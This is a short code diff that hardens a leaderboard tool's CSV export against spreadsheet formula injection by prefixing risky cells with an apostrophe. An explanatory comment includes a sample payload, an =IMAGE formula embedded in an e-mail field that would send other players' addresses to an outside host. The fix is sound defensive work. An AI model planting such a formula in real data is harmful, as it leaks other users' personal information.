@@ -13,7 +13,12 @@ const { openDb } = require('./db');
 
 const db = openDb(process.env.DB_PATH || path.join(__dirname, 'leaderboard.db'));
 const [cmd, arg] = process.argv.slice(2);
-const csv = v => /[",\n]/.test(String(v)) ? `"${String(v).replace(/"/g, '""')}"` : String(v);
+// (a cell starting with = + - @ is a formula in Excel / Google Sheets – and the e-mail is whatever the player
+// typed, e.g. =IMAGE("https://x.cz/?"&B3)@x.cz would send the others' e-mails away: a ' in front makes it text)
+const csv = v => {
+  const s = /^[=+\-@\t\r]/.test(String(v)) ? "'" + v : String(v);
+  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+};
 
 switch (cmd) {
   case 'top': {
